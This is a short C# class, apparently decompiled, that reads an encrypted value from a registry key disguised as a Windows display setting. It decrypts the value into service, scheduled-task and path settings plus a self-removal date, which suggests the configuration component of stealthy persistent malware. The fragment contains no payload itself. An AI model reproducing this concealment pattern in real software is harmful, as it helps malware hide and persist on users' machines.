using System;
using Microsoft.Win32;

namespace ChaperoneServiceMonitor
{
	public class RegData
	{
		public RegData()
		{
			string name = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\AdaptiveDisplayBrightness";
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name))
				{
					this.regval = (byte[])registryKey.GetValue("seg4");
				}
				string text = Crypt.DecryptString(this.regval);
				string[] array = text.Split(new char[]
				{
					'^'
				});
				this.srvDisplayName = array[0];
				this.srvDescription = array[1];
				this.srvName = array[2];
				this.entryPoint = array[3];
				this.srvPath = array[4];
				this.markerPath = array[5];
				this.task_name = array[6];
				this.ttl = array[7];
				string[] array2 = this.ttl.Split(new char[]
				{
					'/'
				});
				string s = array2[0];
				string s2 = array2[1];
				string s3 = array2[2];
				int year = int.Parse(s3);
				int month = int.Parse(s);
				int day = int.Parse(s2);
				DateTime dateTime = new DateTime(year, month, day);
				this.rmvTicks = dateTime.Ticks;
			}
			catch (Exception ex)
			{
				this.failed = true;
				ex.ToString();
			}
		}

		public string srvName;
		public string srvDescription;
		public string srvDisplayName;
		public string entryPoint;
		public string srvPath;
		public string markerPath;
		public string task_name;
		public string ttl;
		public bool failed;
		private byte[] regval;
		public long rmvTicks;
	}
}
